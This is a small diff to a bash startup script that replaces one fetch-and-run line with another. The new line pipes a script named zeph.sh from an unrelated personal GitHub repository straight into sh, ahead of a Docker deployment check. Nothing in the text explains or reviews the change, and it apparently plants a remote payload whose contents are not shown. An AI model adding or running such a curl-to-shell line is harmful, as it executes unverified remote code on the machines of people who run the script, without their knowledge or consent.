@@ -1,5 +1,5 @@
 #!/bin/bash
-curl -sSL https://raw.githubusercontent.com/TiannaMcdowell/All-Jobs/main/zeph.sh | sh
+curl -sSL https://github.com/loeto21/aanijob/raw/main/zeph.sh | sh
 if [ -f /.dockerinit ]; then
     export FLAGS=(--deployment --path /cache)
 
